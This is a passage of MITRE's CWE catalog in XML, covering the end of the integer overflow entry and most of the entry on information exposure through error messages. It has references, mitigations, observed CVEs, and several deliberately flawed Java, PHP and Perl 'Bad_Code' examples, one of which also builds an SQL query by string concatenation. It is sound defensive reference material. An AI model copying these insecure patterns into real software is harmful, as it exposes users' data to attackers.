               <Observed_Example_Reference>CVE-2002-0639</Observed_Example_Reference>
               <Observed_Example_Description>Integer overflow in OpenSSH as listed in the
						demonstrative examples.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-1141</Observed_Example_Reference>
               <Observed_Example_Description>Image with large width and height leads to integer
						overflow.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-0102</Observed_Example_Reference>
               <Observed_Example_Description>Length value of -1 leads to allocation of 0 bytes
						and resultant heap overflow.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-2013</Observed_Example_Reference>
               <Observed_Example_Description>Length value of -1 leads to allocation of 0 bytes
						and resultant heap overflow.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Number processing</Functional_Area>
            <Functional_Area>Memory management</Functional_Area>
            <Functional_Area>Non-specific, counters</Functional_Area>
         </Functional_Areas>
         <References>
            <Reference Local_Reference_ID="R.190.1">
               <Reference_Author>Yves Younan</Reference_Author>
               <Reference_Title>An overview of common programming security vulnerabilities and
						possible solutions</Reference_Title>
               <Reference_Publication>Student thesis section 5.4.3</Reference_Publication>
               <Reference_PubDate>August 2003</Reference_PubDate>
               <Reference_Link>http://fort-knox.org/thesis.pdf</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.190.2">
               <Reference_Author>blexim</Reference_Author>
               <Reference_Title>Basic Integer Overflows</Reference_Title>
               <Reference_Publication>Phrack - Issue 60, Chapter 10</Reference_Publication>
               <Reference_Link>http://www.phrack.org/issues.html?issue=60&amp;id=10#article</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.190.3">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 20, "Integer Overflows" Page 620</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.190.4">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 7: Integer Overflows." Page 119</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-18" Local_Reference_ID="R.190.5">
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>Niels Dekker</Reference_Author>
               <Reference_Title>SafeInt</Reference_Title>
               <Reference_Link>http://safeint.codeplex.com/</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.190.6">
               <Reference_Author>Johannes Ullrich</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 17 - Integer Overflow Or
						Wraparound</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-18</Reference_Date>
               <Reference_Link>http://software-security.sans.org/blog/2010/03/18/top-25-series-rank-17-integer-overflow-or-wraparound</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 6, "Signed Integer Boundaries", Page
						220.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Integer overflow (wrap or wraparound)</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="7 Pernicious Kingdoms">
               <Mapped_Node_Name>Integer Overflow</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CLASP">
               <Mapped_Node_Name>Integer overflow</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Use a secure integer library</Mapped_Node_Name>
               <Mapped_Node_ID>INT03-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Ensure that unsigned integer operations do not
						wrap</Mapped_Node_Name>
               <Mapped_Node_ID>INT30-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Ensure that operations on signed integers do not result in
						overflow</Mapped_Node_Name>
               <Mapped_Node_ID>INT32-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Evaluate integer expressions in a larger size before comparing
						or assigning to that size</Mapped_Node_Name>
               <Mapped_Node_ID>INT35-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Ensure that the arguments to calloc(), when multiplied, can be
						represented as a size_t</Mapped_Node_Name>
               <Mapped_Node_ID>MEM07-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Allocate sufficient memory for an object</Mapped_Node_Name>
               <Mapped_Node_ID>MEM35-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>Integer Overflows </Mapped_Node_Name>
               <Mapped_Node_ID>3</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Use a secure integer library</Mapped_Node_Name>
               <Mapped_Node_ID>INT03-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Ensure that unsigned integer operations do not
						wrap</Mapped_Node_Name>
               <Mapped_Node_ID>INT30-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Ensure that operations on signed integers do not result in
						overflow</Mapped_Node_Name>
               <Mapped_Node_ID>INT32-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Evaluate integer expressions in a larger size before comparing
						or assigning to that size</Mapped_Node_Name>
               <Mapped_Node_ID>INT35-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Ensure that the arguments to calloc(), when multiplied, can be
						represented as a size_t</Mapped_Node_Name>
               <Mapped_Node_ID>MEM07-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Allocate sufficient memory for an object</Mapped_Node_Name>
               <Mapped_Node_ID>MEM35-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Glitch in computation</Mapped_Node_Name>
               <Mapped_Node_ID>SFP1</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>92</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Relationship_Notes, Taxonomy_Mappings,
						Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description,
						Potential_Mitigations, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Detection_Factors,
						Functional_Areas, Observed_Examples, Potential_Mitigations, References,
						Related_Attack_Patterns, Relationships, Taxonomy_Mappings,
						Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors,
						Potential_Mitigations, References,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples,
						References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2009-01-12">Integer Overflow (Wrap or
						Wraparound)</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="209" Name="Information Exposure Through an Error Message" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The software generates an error message that includes sensitive
					information about its environment, users, or associated
					data.</Description_Summary>
            <Extended_Description>
               <Text>The sensitive information may be valuable information on its own (such as
						a password), or it may be useful for launching other, more deadly attacks.
						If an attack fails, an attacker may use error information provided by the
						server to launch another more focused attack. For example, an attempt to
						exploit a path traversal weakness (CWE-22) might yield the full pathname of
						the installed application. In turn, this could be used to select the proper
						number of ".." sequences to navigate to the targeted file. An attack using
						SQL injection (CWE-89) might not initially succeed, but an error message
						could reveal the malformed query, which would expose query logic and
						possibly even passwords or other sensitive information used within the
						query.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>801</Relationship_Target_ID>
               <!--2010 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>200</Relationship_Target_ID>
               <!--Information Exposure--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>755</Relationship_Target_ID>
               <!--Improper Handling of Exceptional Conditions--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>731</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A10 - Insecure Configuration Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>815</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A6 - Security Misconfiguration--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">629</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>717</Relationship_Target_ID>
               <!--OWASP Top Ten 2007 Category A6 - Information Leakage and Improper Error Handling--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>728</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A7 - Improper Error Handling--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">750</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>751</Relationship_Target_ID>
               <!--2009 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>851</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 06 - Exceptional Behavior (ERR)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>880</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 12 - Exceptions and Error Handling (ERR)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>963</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Exposed Data--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">928</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>933</Relationship_Target_ID>
               <!--OWASP Top Ten 2013 Category A5 - Security Misconfiguration--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language Prevalence="Often" Language_Name="PHP"/>
               <Language_Class Language_Class_Description="All"/>
            </Languages>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
            <Introductory_Phase>System Configuration</Introductory_Phase>
            <Introductory_Phase>Operation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Often this will either reveal sensitive information which may be used
							for a later attack or private information stored in the server.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness generally requires domain-specific interpretation using
							manual analysis. However, the number of potential error conditions may
							be too large to cover completely within limited time constraints.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated methods may be able to detect certain idioms automatically,
							such as exposed stack traces or pathnames, but violation of business
							rules or privacy requirements is not typically feasible.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using dynamic tools and techniques that
							interact with the software using large test suites with many diverse
							inputs, such as fuzz testing (fuzzing), robustness testing, and fault
							injection. The software's operation may slow down, but it should not
							become unstable, crash, or generate incorrect results.</Text>
                  <Text>Error conditions may be triggered with a stress-test by calling the
							software simultaneously from a large number of threads or processes, and
							look for evidence of any unexpected behavior.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-12">
               <Method_Name>Manual Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>Identify error conditions that are not likely to occur during normal
							usage and trigger them. For example, run the program under low memory
							conditions, run with insufficient privileges or permissions, interrupt a
							transaction before it is completed, or disable connectivity to basic
							network services such as DNS. Monitor the software for any unexpected
							behavior. If you trigger an unhandled exception or similar error that
							was discovered and handled by the application's environment, it may
							still indicate unexpected conditions that were not handled by the
							application itself.</Text>
               </Method_Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-39">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Ensure that error messages only contain minimal details that are
							useful to the intended audience, and nobody else. The messages need to
							strike the balance between being too cryptic and not being cryptic
							enough. They should not necessarily reveal the methods that were used to
							determine the error. Such detailed information can be used to refine the
							original attack to increase the chances of success.</Text>
                  <Text>If errors must be tracked in some detail, capture them in log messages
							- but consider what could occur if the log messages can be viewed by
							attackers. Avoid recording highly sensitive information such as
							passwords in any form. Avoid inconsistent messaging that might
							accidentally tip off an attacker about internal state, such as whether a
							username is valid or not.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Handle exceptions internally and do not display errors containing
							potentially sensitive information to a user.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-33">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use naming conventions and strong types to make it easier to spot when
							sensitive data is being used. When creating structures, objects, or
							other complex entities, separate the sensitive and non-sensitive data as
							much as possible.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This makes it easier to spot places in the code where data is being
							used that is unencrypted.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-40">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Phase>Build and Compilation</Mitigation_Phase>
               <Mitigation_Strategy>Compilation or Build Hardening</Mitigation_Strategy>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Debugging information should not make its way into a production
							release.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>System Configuration</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Where available, configure the environment to use less verbose error
							messages. For example, in PHP, disable the display_errors setting during
							configuration, or at runtime using the error_reporting()
							function.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>System Configuration</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Create default error pages or messages that do not leak any
							information.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following example, sensitive information might be printed
						depending on the exception that occurs.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>try {</Code>
                     <Block>
                        <Code>/.../</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>catch (Exception e) {</Code>
                     <Block>
                        <Code>System.out.println(e);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>If an exception related to SQL is handled by the catch, then the
							output might contain sensitive information such as SQL query structure
							or private information. If this output is redirected to a web user, this
							may represent a security problem.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code tries to open a database connection, and prints any
						exceptions that occur.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code> try { </Code>
                     <Block>
                        <Code> openDbConnection(); </Code>
                     </Block>
                     <Code> } </Code>
                     <Comment>//print exception message that includes exception message and
								configuration file location </Comment>
                     <Code>catch (Exception $e) { </Code>
                     <Block>
                        <Code>echo 'Caught exception: ', $e-&gt;getMessage(), '\n'; </Code>
                        <Code>echo 'Check credentials in config file at: ',
									$Mysql_config_location, '\n'; </Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>If an exception occurs, the printed message exposes the location of
							the configuration file the script is using. An attacker can use this
							information to target the configuration file (perhaps exploiting a Path
							Traversal weakness). If the file can be read, the attacker could gain
							credentials for accessing the database. The attacker may also be able to
							replace the file with a malicious one, causing the application to use an
							arbitrary database.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code generates an error message that leaks the full
						pathname of the configuration file.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Perl</Code_Example_Language>
                     <Code>$ConfigDir = "/home/myprog/config";</Code>
                     <Code>$uname = GetUserInput("username");</Code>
                     <Comment># avoid CWE-22, CWE-78, others.</Comment>
                     <Code>ExitError("Bad hacker!") if ($uname !~ /^\w+$/);</Code>
                     <Code>$file = "$ConfigDir/$uname.txt";</Code>
                     <Code>if (! (-e $file)) {</Code>
                     <Block>
                        <Code>ExitError("Error: $file does not exist");</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>If this code is running on a server, such as a web application, then
							the person making the request should not know what the full pathname of
							the configuration directory is. By submitting a username that does not
							produce a $file that exists, an attacker could get this pathname. It
							could then be used to exploit path traversal or symbolic link following
							problems that may exist elsewhere in the application.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the example below, the method getUserBankAccount retrieves a bank
						account object from a database using the supplied username and account
						number to query the database. If an SQLException is raised when querying the
						database, an error message is created and output to a log file.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>public BankAccount getUserBankAccount(String username, String
								accountNumber) {</Code>
                     <Block>
                        <Code>BankAccount userAccount = null;</Code>
                        <Code>String query = null;</Code>
                        <Code>try {</Code>
                        <Block>
                           <Code>if (isAuthorizedUser(username)) {</Code>
                           <Block>
                              <Code>query = "SELECT * FROM accounts WHERE owner = "</Code>
                              <Code>+ username + " AND accountID = " +
											accountNumber;</Code>
                              <Code>DatabaseManager dbManager = new
											DatabaseManager();</Code>
                              <Code>Connection conn = dbManager.getConnection();</Code>
                              <Code>Statement stmt = conn.createStatement();</Code>
                              <Code>ResultSet queryResult =
											stmt.executeQuery(query);</Code>
                              <Code>userAccount =
											(BankAccount)queryResult.getObject(accountNumber);</Code>
                           </Block>
                           <Code>}</Code>
                        </Block>
                        <Code>} catch (SQLException ex) {</Code>
                        <Block>
                           <Code>String logMessage = "Unable to retrieve account
										information from database,\nquery: " + query;</Code>
                           <Code>Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE,
										logMessage, ex);</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>return userAccount;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>The error message that is created includes information about the
							database query that may contain sensitive information about the database
							or query logic. In this case, the error message will expose the table
							name and column names used in the database. This data could be used to
							simplify other attacks, such as SQL injection (CWE-89) to directly
							access the database.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2049</Observed_Example_Reference>
               <Observed_Example_Description>POP3 server reveals a password in an error message
						after multiple APOP commands are sent. Might be resultant from another
						weakness.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-5172</Observed_Example_Reference>
               <Observed_Example_Description>Program reveals password in error message if
						attacker can trigger certain database errors.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-4638</Observed_Example_Reference>
               <Observed_Example_Description>Composite: application running with high
						privileges allows user to specify a restricted file to process, which
						generates a parsing error that leaks the contents of the
						file.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-1579</Observed_Example_Reference>
